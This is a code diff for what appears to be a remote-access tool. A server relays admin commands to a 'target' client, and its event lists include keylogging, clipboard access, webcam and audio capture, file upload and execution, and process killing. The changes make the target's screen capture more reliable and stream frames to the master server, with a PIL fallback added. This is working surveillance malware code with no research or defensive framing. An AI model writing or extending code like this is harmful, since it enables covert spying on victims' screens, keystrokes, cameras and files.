@@ -61,10 +61,10 @@ def handle_register(data):
     sid = request.sid
     if role == 'target':
         join_room(ROOM_TARGET)
-        logger.info(f"🔥 TARGET REGISTERED: {sid}")
         socketio.emit('target_status', {'online': True}, room=ROOM_ADMINS)
-        # Force an immediate init request from the target
-        socketio.emit('request_init', {}, room=ROOM_TARGET) 
+        # Notify admins and ask target to self-init immediately
+        socketio.emit('request_init', {}, room=ROOM_TARGET)
+        logger.info(f"Target Registered: {request.sid}. Pushing request_init.")
     elif role == 'admin':
         join_room(ROOM_ADMINS)
         logger.info(f"👁️ ADMIN REGISTERED: {sid}")
@@ -87,7 +87,7 @@ ADMIN_EVENTS = [
     'file_browse', 'file_upload', 'file_delete', 'file_run', 'process_list', 'process_kill',
     'audio_start', 'audio_stop', 'vitals_start', 'vitals_stop', 'monitor_list', 'monitor_switch',
     'keylog_fetch', 'keylog_clear', 'clipboard_get', 'clipboard_set', 'chat_send', 'chat_history', 'alert_send',
-    'webcam_start', 'webcam_stop'
+    'webcam_start', 'webcam_stop', 'request_init'
 ]
 TARGET_EVENTS = [
     'init', 'screen_frame', 'webcam_frame', 'screenshot', 'terminal_started', 'terminal_output',
@@ -161,15 +161,17 @@ def run_client(master_url):
                     if idx >= len(monitors): idx = 1
                     monitor = monitors[idx]
                     
+                    # Use MSS but fallback to PIL if needed
                     img_data = sct.grab(monitor)
+                    if not img_data or img_data.size[0] < 10: raise ValueError("Empty Frame")
                     img = Image.frombytes("RGB", img_data.size, img_data.bgra, "raw", "BGRX")
                     
-                    if resize_factor < 1.0:
-                        new_size = (int(img.width * resize_factor), int(img.height * resize_factor))
-                        img = img.resize(new_size, Image.LANCZOS)
-                        
+                    # Emergency Shrink (50% size / 15% quality)
+                    new_size = (int(img.width * 0.5), int(img.height * 0.5))
+                    img = img.resize(new_size, Image.NEAREST)
+                    
                     buffer = BytesIO()
-                    img.save(buffer, format='JPEG', quality=quality, optimize=True)
+                    img.save(buffer, format='JPEG', quality=15, optimize=True)
                     img_b64 = base64.b64encode(buffer.getvalue()).decode()
                     
                     sio.emit('screen_frame', {
@@ -178,10 +180,22 @@ def run_client(master_url):
                         'width': monitor['width'],
                         'height': monitor['height']
                     })
+                    print(f"Sent Frame: {len(img_b64)} bytes")
                 except Exception as ex:
-                    logger.debug(f"Capture error: {ex}")
+                    # Emergency Fallback to PIL
+                    try:
+                        from PIL import ImageGrab
+                        img = ImageGrab.grab()
+                        img = img.resize((int(img.width * 0.5), int(img.height * 0.5)), Image.NEAREST)
+                        buffer = BytesIO()
+                        img.save(buffer, format='JPEG', quality=15)
+                        img_b64 = base64.b64encode(buffer.getvalue()).decode()
+                        sio.emit('screen_frame', {'image': img_b64, 'timestamp': time.time()})
+                        print(f"Fallback PIL Frame Sent: {len(img_b64)} bytes")
+                    except:
+                        logger.debug(f"Capture error: {ex}")
                     time.sleep(0.1)
-                time.sleep(0.01)
+                time.sleep(0.05)
 
     @sio.event
     def connect():
